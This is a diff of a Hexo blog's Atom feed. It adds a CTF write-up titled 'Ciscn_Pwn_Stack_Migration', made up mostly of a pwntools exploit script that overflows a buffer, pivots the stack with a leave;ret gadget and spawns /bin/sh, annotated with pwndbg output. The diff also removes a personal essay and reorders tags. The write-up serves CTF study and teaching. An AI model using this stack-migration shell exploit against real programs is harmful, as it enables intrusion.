@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.yof3ng.xyz/"/>
-  <updated>2019-07-18T08:20:52.906Z</updated>
+  <updated>2019-07-18T13:18:52.296Z</updated>
   <id>http://www.yof3ng.xyz/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Ciscn_Pwn_Stack_Migration</title>
+    <link href="http://www.yof3ng.xyz/2019/07/18/Ciscn-Pwn-Stack-Migration/"/>
+    <id>http://www.yof3ng.xyz/2019/07/18/Ciscn-Pwn-Stack-Migration/</id>
+    <published>2019-07-18T13:11:46.000Z</published>
+    <updated>2019-07-18T13:18:52.296Z</updated>
+    
+    <content type="html"><![CDATA[<p>Stack migration in Ciscn…</p><a id="more"></a><h1 id="Ciscn-Pwn-Stack-Migration"><a href="#Ciscn-Pwn-Stack-Migration" class="headerlink" title="Ciscn_Pwn_Stack_Migration"></a>Ciscn_Pwn_Stack_Migration</h1><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># buf_size = 0x28</span><span class="token comment" spellcheck="true"># read_size = 0x30</span><span class="token comment" spellcheck="true"># buf_addr = ebp - 0x28</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># vul loop1:</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy1'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804b000</span><span class="token operator">-</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vul'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">''' Program Status──────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────── EAX  0x30 EBX  0x0 ECX  0xfff9442c ◂— 'Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n' EDX  0xf7ee2890 ◂— 0x0 EDI  0xf7ee1000 ◂— 0x1d9d6c ESI  0xf7ee1000 ◂— 0x1d9d6c EBP  0xfff969a8 —▸ 0x804af00 ◂— 0x0 ESP  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' EIP  0x80485fd (vul+104) ◂— leave  ───────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────────   0x80485ee &lt;vul+89>     push   eax   0x80485ef &lt;vul+90>     push   0x80486ca   0x80485f4 &lt;vul+95>     call   printf@plt &lt;0x80483e0>   0x80485f9 &lt;vul+100>    add    esp, 0x10   0x80485fc &lt;vul+103>    nop     ► 0x80485fd &lt;vul+104>    leave     0x80485fe &lt;vul+105>    ret       0x80485ff &lt;main>       lea    ecx, dword ptr [esp + 4]   0x8048603 &lt;main+4>     and    esp, 0xfffffff0   0x8048606 &lt;main+7>     push   dword ptr [ecx - 4]   0x8048609 &lt;main+10>    push   ebp────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ↓──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────── ► f 0  80485fd vul+104─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Breakpoint *vul+104pwndbg> stack 2000:0000│ esp  0xfff96980 ◂— 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'... ↓0a:0028│ ebp  0xfff969a8 —▸ 0x804af00 ◂— 0x00b:002c│      0xfff969ac —▸ 0x804859b (vul+6) ◂— sub    esp, 4'''</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''**********Notes*************{???} means a program address random....{==>} means point to....{&lt;= } means value at the address'''</span><span class="token triple-quoted-string string">'''*********cover ebp**********ebp = ??? ==> 0x804af00 &lt;= 0'''</span><span class="token triple-quoted-string string">'''***** hijacking ebp and cover return address to vul+6 ******leave:     mov esp,ebp ;            esp = ??? ==>0x804af00 &lt;= 0    pob ebp ;                     esp = ???+4 ;         ebp = 0x804af00 &lt;=0ret vul+6;'''</span><span class="token comment" spellcheck="true">#vul loop2:</span><span class="token comment" spellcheck="true">#gadget</span>leave_ret <span class="token operator">=</span> <span class="token number">0x80484b8</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'good boy2'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed8</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/bin/sh\0'</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804aed4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">,</span><span class="token string">'b *vul+104'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''******** send payload ********1.buf_addr = ebp - 0x28 = 0x804af00 - 0x28 = 0x804aed82.(0x804aed8 + 0x10 = 0x804aef8) This value was writed in 0x 804aef0...It means that args point to '/bin/sh' at 0x804aef8...3.ebp = 0x804af00 ==> 0x804aed4 &lt;= 04.leave:        mov esp,ebp:            esp = 0x804af00 ==> 0x804aed4 &lt;= 0 ;         pop ebp:            esp = 0x804af04 ==> leave_ret;            ebp = 0x804aed4;5.ret leave_ret'''</span><span class="token triple-quoted-string string">'''******* leave_ret*********leave:    mov esp,ebp:        esp = 0x804aed4 &lt;= 0;    pop ebp:        esp = 0x804aed8 ==> system        ebp = 0x0;ret system('/bin/sh');----------------------------------------------------------------------------pwndbg> stack 3000:0000│ esp  0x804aed8 —▸ 0x8048400 (system@plt) ◂— jmp    dword ptr [0x804a018]01:0004│      0x804aedc ◂— 0x002:0008│      0x804aee0 —▸ 0x804aee8 ◂— '/bin/sh'03:000c│      0x804aee4 ◂— 0x004:0010│      0x804aee8 ◂— '/bin/sh'05:0014│      0x804aeec ◂— 0x68732f /* '/sh' */06:0018│      0x804aef0 ◂— 0x0... ↓0a:0028│      0x804af00 —▸ 0x804aed4 ◂— 0x00b:002c│      0x804af04 —▸ 0x80484b8 (deregister_tm_clones+40) ◂— leave  0c:0030│      0x804af08 ◂— 0x0------------------------------------------------------------------------------'''</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Stack migration in Ciscn…&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
+    
+    
+      <category term="Ciscn" scheme="http://www.yof3ng.xyz/tags/Ciscn/"/>
+    
+      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>Binary_Security_Guidance</title>
@@ -152,11 +176,11 @@
       <category term="译文" scheme="http://www.yof3ng.xyz/categories/%E8%AF%91%E6%96%87/"/>
     
     
+      <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
       <category term="资讯" scheme="http://www.yof3ng.xyz/tags/%E8%B5%84%E8%AE%AF/"/>
     
       <category term="译文" scheme="http://www.yof3ng.xyz/tags/%E8%AF%91%E6%96%87/"/>
-    
-      <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
@@ -180,9 +204,9 @@
     
       <category term="网络安全" scheme="http://www.yof3ng.xyz/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
-      <category term="ssrf" scheme="http://www.yof3ng.xyz/tags/ssrf/"/>
-    
       <category term="write-up" scheme="http://www.yof3ng.xyz/tags/write-up/"/>
+    
+      <category term="ssrf" scheme="http://www.yof3ng.xyz/tags/ssrf/"/>
     
   </entry>
   
@@ -254,9 +278,9 @@
       <category term="信息安全" scheme="http://www.yof3ng.xyz/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="追踪溯源" scheme="http://www.yof3ng.xyz/tags/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90/"/>
-    
       <category term="信息安全" scheme="http://www.yof3ng.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="追踪溯源" scheme="http://www.yof3ng.xyz/tags/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90/"/>
     
   </entry>
   
@@ -487,28 +511,6 @@
       <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
     
       <category term="环境部署" scheme="http://www.yof3ng.xyz/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Some_words_of_today</title>
-    <link href="http://www.yof3ng.xyz/2018/10/29/Some-words-of-today/"/>
-    <id>http://www.yof3ng.xyz/2018/10/29/Some-words-of-today/</id>
-    <published>2018-10-29T15:03:45.000Z</published>
-    <updated>2019-04-02T08:46:28.150Z</updated>
-    
-    <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Some-words-of-today"><a href="#Some-words-of-today" class="headerlink" title="Some_words_of_today"></a>Some_words_of_today</h1><blockquote><p>今日份闲扯。🙃</p></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 现在时间已经23:06了，今天给几位学弟简单讲了一些小知识（虽然自己很low，但希望学弟可以很强），写完这篇水文就睡吧。不知道什么时候开始就已经习惯了这么晚睡，虽然知道晚睡啥的，熬夜什么的对身体不好balabala，但是生活所迫，被生活安排的明明白白，虽然目前国内计算机行业现状如下图：</p><p><img src="https://i.loli.net/2018/10/29/5bd722c007501.png" alt=""></p><p>抑或是如下图：</p><p><img src="https://i.loli.net/2018/10/29/5bd72383adca2.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 刚入学那会儿，大学嘛，憧憬的是啥？无非就是吃喝玩乐，交朋友（找女票？）以及少部分学习。对啊，就是这样没错啊，大家都是这么认为的嘛，一直到大一过去一大半，我也是学学停停，玩玩游戏，<del>以及一场起于高中，止于大一末，经历过一起，也经历过分离，还经历过异地，像电视剧一样的恋爱</del>,呸呸呸 。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 很普遍的一个现象是：很多刚踏入大学校门的人，就想开始来一场轰轰烈烈的恋爱，来释放自己的天性，拥抱心中的美好😄，到后来却往往是最初开始的人走不到一块儿。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 或许得到了什么东西，就该失去点另外的什么东西。所以那段时间我只是生活在一个小圈子里，虽然错过了很多很多的精彩，虚度了些许时日，但也成长了许多。经历了种种后，我才逐渐明白我的大学生活，乃至人生意义所在😥，风花雪月不过偶尔，自强不息便有远方。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所谓大学者，非谓有大楼之谓也，有大师之谓也，但是现在又有几个能做到？。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 与其奢望平台如何如何帮自己，那为何不“天行健，君子以自强不息”呢？</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 大学只是一个平台，一个给你去生活，去展示，去实现，去创造，去体验社会的小空间。当然，可能某些人进入大学之后，啊我的大学怎么怎么样，怎么怎么惨，抱怨资源不公，哀叹社会如何，然后转身又扑进了游戏世界。想想其实也挺傻的，不公能怎样？谁让自己搏不了一个好平台，谁让自己得不到那点仅有的资源，又是谁在一次一次堕落之后继续堕落？那肯定是自己咯😭。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所以如果自己不去实现一点能够实现的价值，来印证一下自己的能力，那如何才能获得那所谓的公平，如何去融入你批判，哀叹的那个社会。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 未来之路虽然坎坷，但希望与诸位同行之人，共同前进。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; Publish by Yof3ng.</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;……&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="杂文" scheme="http://www.yof3ng.xyz/categories/%E6%9D%82%E6%96%87/"/>
-    
-    
-      <category term="杂文" scheme="http://www.yof3ng.xyz/tags/%E6%9D%82%E6%96%87/"/>
     
   </entry>
   
